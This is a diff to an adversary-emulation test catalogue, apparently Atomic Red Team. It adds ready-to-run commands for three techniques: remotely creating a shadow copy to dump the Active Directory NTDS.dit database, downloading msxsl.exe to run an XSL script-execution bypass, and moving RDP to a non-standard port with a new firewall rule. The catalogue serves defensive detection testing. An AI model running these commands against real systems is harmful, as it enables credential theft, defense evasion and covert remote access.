@@ -3961,6 +3961,40 @@ credential-access:
 '
         name: command_prompt
         elevation_required: true
+    - name: Create Volume Shadow Copy remotely with WMI
+      auto_generated_guid: d893459f-71f0-484d-9808-ec83b2b64226
+      description: |
+        This test is intended to be run from a remote workstation with domain admin context.
+        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+      supported_platforms:
+      - windows
+      input_arguments:
+        drive_letter:
+          description: Drive letter to source VSC (including colon and backslash)
+          type: String
+          default: C:\
+        target_host:
+          description: IP Address / Hostname you want to target
+          type: String
+          default: localhost
+      dependencies:
+      - description: 'Target must be a reachable Domain Controller, and current context
+          must be domain admin
+
+'
+        prereq_command: 'wmic /node:"#{target_host}" shadowcopy list brief
+
+'
+        get_prereq_command: 'echo Sorry, can''t connect to target host, check: network,
+          firewall or permissions (must be admin on target)
+
+'
+      executor:
+        command: 'wmic /node:#{target_host} shadowcopy call create Volume=#{drive_letter}
+
+'
+        name: command_prompt
+        elevation_required: true
     - name: Create Volume Shadow Copy with Powershell
       auto_generated_guid: 542bb97e-da53-436b-8e43-e0a7d31a6c24
       description: |
@@ -38716,12 +38750,10 @@ defense-evasion:
     atomic_tests:
     - name: MSXSL Bypass using local files
       auto_generated_guid: ca23bfb2-023f-49c5-8802-e66997de462d
-      description: 'Executes the code specified within a XSL script tag during XSL
-        transformation using a local payload. Requires download of MSXSL from Microsoft
-        at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe
-        when test sucessfully executed, while AV turned off.
-
-'
+      description: "Executes the code specified within a XSL script tag during XSL
+        transformation using a local payload. \nRequires download of MSXSL from Microsoft
+        (Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714
+        ). \nOpen Calculator.exe when test sucessfully executed, while AV turned off.\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -38753,6 +38785,16 @@ defense-evasion:
         get_prereq_command: |
           New-Item -Type Directory (split-path #{xslfile}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
+      - description: 'msxsl.exe must exist on disk at specified location (#{msxsl_exe})
+
+'
+        prereq_command: 'if (Test-Path #{msxsl_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://web.archive.org/web/20200803205229/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe" -OutFile "$env:TEMP\msxsl.exe"
+          Copy-Item $env:TEMP\msxsl.exe #{msxsl_exe} -Force
+          Remove-Item $env:TEMP\msxsl.exe
       executor:
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
 
@@ -65479,6 +65521,31 @@ lateral-movement:
         cleanup_command: |
           $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
           if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
+        name: powershell
+    - name: Changing RDP Port to Non Standard Port
+      auto_generated_guid: 2f840dd4-8a2e-4f44-beb3-6b2399ea3771
+      description: 'Changing RDP Port to Non Standard Port via Remote Desktop Application
+        over Powershell
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        OLD_Remote_Port:
+          description: Default RDP Listening Port
+          type: String
+          default: '3389'
+        NEW_Remote_Port:
+          description: New RDP Listening Port
+          type: String
+          default: '4489'
+      executor:
+        command: |
+          Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{NEW_Remote_Port}
+          New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}
+        cleanup_command: "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal
+          Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{OLD_Remote_Port}\nRemove-NetFirewallRule
+          -DisplayName \"RDPPORTLatest-TCP-In\"  \n"
         name: powershell
   T1563:
     technique:
